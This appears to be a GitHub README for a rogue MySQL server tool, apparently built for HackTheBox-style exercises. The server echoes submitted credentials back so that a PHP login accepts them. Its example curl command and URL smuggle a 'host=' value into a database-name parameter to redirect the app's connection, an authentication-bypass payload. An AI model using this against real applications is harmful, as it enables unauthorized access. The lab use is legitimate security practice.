# MySQL-Auth-Server

The purpose of this tool is to Act like "MySQL Server" Without Installing MySQL Server, And return a row with the same username And password of the query.

## Inspired by
https://github.com/Gifts/Rogue-MySql-Server

## Getting Started

```
git clone http://github.com/diefunction/MySQL-Auth-Server.git
```

### Examples
If MySQL is installed and running
Stop MySQL service
```
service mysql stop
pkill -9 mysql
```
Start MySQL Auth Server
```
python3 MySQL-Auth-Server.py
```
Start apache2 web server
```
service apache2 start
```
Copy index.php success.php from examples folder to your web server default /var/www/html/
```
cp ./examples/index.php ./examples/success.php /var/www/html/
```
CURL
```
curl --cookie $(curl -I -X GET 'http://localhost/index.php?login=&username=test&password=test&db=testing;host=127.0.0.1:3306' | grep -o -P '(?<=: ).*(?=;)' | awk 'NR==1{print $1}') -X GET http://localhost/success.php
```
![Curl Example Image](https://raw.githubusercontent.com/DieFunction/MySQL-Auth-Server/master/examples/img.png)

Browser
```
http://localhost/index.php?login=&username=test&password=test&db=testing;host=127.0.0.1:3306
```
after refreshing the page the browser will redirect you to success.php


### About

HTB: https://www.hackthebox.eu/home/users/profile/47396 | https://www.hackthebox.eu/profile/47396 <br />
Twitter: @diefunction <br />
Discord: Diefunction#1337
